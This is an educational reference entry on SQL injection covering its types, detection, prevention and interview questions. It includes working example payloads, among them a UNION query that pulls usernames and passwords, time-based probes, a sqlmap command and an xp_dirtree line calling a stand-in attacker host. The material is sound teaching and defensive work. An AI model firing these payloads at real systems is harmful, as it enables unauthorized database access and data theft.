# SQL Injection

## Definition
SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. By inserting malicious SQL statements into application input fields (form inputs, URL parameters, cookies), an attacker can read, modify, or delete database data, execute administrative operations, and in some cases execute commands on the database server. SQLi is one of the oldest and most damaging web vulnerabilities.

## Why It Matters
SQL Injection has caused some of the largest data breaches in history (Heartland Payment Systems, Yahoo, Sony PlayStation Network, TalkTalk). It remains a critical threat because: (1) databases contain the most valuable data (user credentials, PII, financial records, intellectual property); (2) many legacy applications still have unpatched SQLi vulnerabilities; and (3) automated tools (sqlmap) make exploitation trivial. SQLi consistently ranks in the OWASP Top 10.

## Where It Appears in the Path
SQL Injection is covered in the web security module as one of the most critical web application vulnerabilities. It follows HTTP/HTTPS fundamentals and database basics. It is prerequisite for understanding web penetration testing, database security, and secure coding practices.

## Prerequisites
- Web application fundamentals (HTTP requests, parameters, cookies)
- Basic database knowledge (tables, rows, SQL SELECT/INSERT/UPDATE/DELETE)
- HTTP methods (GET/POST)

## Types of SQL Injection

### In-Band SQLi (Same Channel)
Attacker uses the same communication channel to inject and retrieve results. Two subtypes:

**Error-Based SQLi**: Relies on database error messages to extract information. Attacker crafts queries that cause informative errors revealing database structure or data.
```
' AND 1=CONVERT(int, (SELECT @@version)) --
```

**Union-Based SQLi**: Uses the UNION SQL operator to combine query results with attacker-controlled data. Requires matching column count and compatible data types.
```
' UNION SELECT username, password FROM users --
```

### Inferential (Blind) SQLi
No visible error messages or query results. Attacker infers information through true/false responses or timing delays.

**Boolean-Based Blind**: Sends queries that return true or false based on injected condition. Observes page behavior differences.
```
' AND (SELECT ASCII(SUBSTRING((SELECT @@version),1,1))) > 80 --
```

**Time-Based Blind**: Uses database time delay functions (SLEEP, WAITFOR DELAY, BENCHMARK) to infer true/false conditions based on response delays.
```
' OR IF(1=1, SLEEP(5), 0) --
```

### Out-of-Band SQLi
Data is retrieved through a different channel (usually DNS or HTTP). Used when database responses are not accessible in-band. Requires certain database features (xp_dirtree on MSSQL, UTL_HTTP on Oracle).
```
'; exec master..xp_dirtree '//attacker-server/aaa' --
```

## Detection Techniques
- **Single quote test**: `'` — if error or different behavior, potential SQLi.
- **Boolean test**: `' AND 1=1 --` (true) vs `' AND 1=2 --` (false). Different responses indicate injection point.
- **Time delay**: `' OR SLEEP(5) --` — 5-second delay confirms injection.
- **Order by/Union**: Increment column count: `' ORDER BY 1 --` then `2`, `3`, etc. until error. Then UNION SELECT matching columns.
- **Automated tools**: `sqlmap -u "http://target.com/page?id=1" --dbs`

## SQL Injection Prevention

### Parameterized Queries (Prepared Statements)
The most effective defense. SQL statement templates are pre-compiled with placeholders; user input is bound as parameters, never concatenated into SQL.
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
The database treats the parameters as data, not executable SQL code.

### Stored Procedures
Database procedures with parameterized input can reduce risk, but can still be vulnerable if dynamic SQL is used inside the procedure.

### Input Validation & Whitelisting
Validate input against expected patterns (whitelist regex for email, UUID, integer) on the server side. Reject invalid input.

### Escaping / Encoding
Escape special SQL characters (single quotes, backslashes) using database-specific escape functions. Less robust than parameterized queries — can be bypassed in certain contexts.

### Least Privilege
Database accounts used by applications should have minimal permissions. Web app should never connect as 'sa' (SQL Server) or 'root' (MySQL). Restrict to only necessary tables and operations (SELECT for read, separate accounts for writes if possible).

### WAF (Web Application Firewall)
Can detect and block SQLi patterns in HTTP requests. Provides defense-in-depth but should not replace secure coding.

## Common Interview Questions
1. **What is SQL Injection and how does it work?** Inserting malicious SQL through application input into database queries, allowing attackers to read/modify database data.
2. **What is the difference between UNION-based and error-based SQLi?** UNION-based uses UNION to combine result sets with injected data. Error-based relies on database error messages for information extraction.
3. **What is blind SQL injection?** SQLi without visible output — attacker infers data through true/false responses (boolean) or response delays (time-based).
4. **How do you prevent SQL injection?** Parameterized queries/prepared statements (primary), input validation, least privilege database accounts, stored procedures (with caution), WAF for defense-in-depth.
5. **What is the difference between SQL injection and NoSQL injection?** SQLi targets SQL databases, using SQL syntax. NoSQL injection targets NoSQL databases (MongoDB, Couchbase) using JSON queries, $where operators.
6. **How would you exploit a blind SQL injection?** Use boolean-based (different responses for true/false conditions) or time-based (SLEEP/WAITFOR DELAY) to extract data one character at a time.

## Further Reading
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [sqlmap User Manual](https://sqlmap.org/)
- TryHackMe: SQL Injection room
